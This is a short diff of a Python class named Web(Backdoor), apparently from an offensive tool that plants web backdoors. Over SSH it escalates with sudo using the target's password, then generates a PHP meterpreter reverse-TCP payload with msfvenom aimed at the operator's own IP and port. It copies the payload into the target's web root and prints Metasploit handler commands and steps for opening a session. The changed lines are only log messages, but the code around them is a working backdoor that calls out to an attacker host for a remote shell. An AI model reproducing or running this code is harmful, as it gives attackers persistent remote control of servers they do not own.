@@ -26,10 +26,9 @@ class Web(Backdoor):
 	name = self.get_value("name")
 	self.target.scpFiles(self, "web/install.sh", False)
 	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S bash install.sh")
-	print("Installing LAMP stack.")
-	#self.target.ssh.exec_command("echo password | sudo -S apt-get install apache2")
 	print("Starting Apache server.")
 	os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + self.core.localIP + " LPORT=" + str(port) + " -f raw > " + name) 
+	print("Creating backdoor")
 	self.target.scpFiles(self, name, False)
 	print("Shipping backdoor")
 	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S rm /var/www/html/" + name)
@@ -40,7 +39,7 @@ class Web(Backdoor):
 	print("set LPORT " + str(port))
 	print("exploit")
 	print("")
-	print("Now visit the site at " + self.target.hostname + "/" + name)
+	print("Then visit the site at " + self.target.hostname + "/" + name)
 	
 	print("To begin your session, type sessions -i [session id]")
   
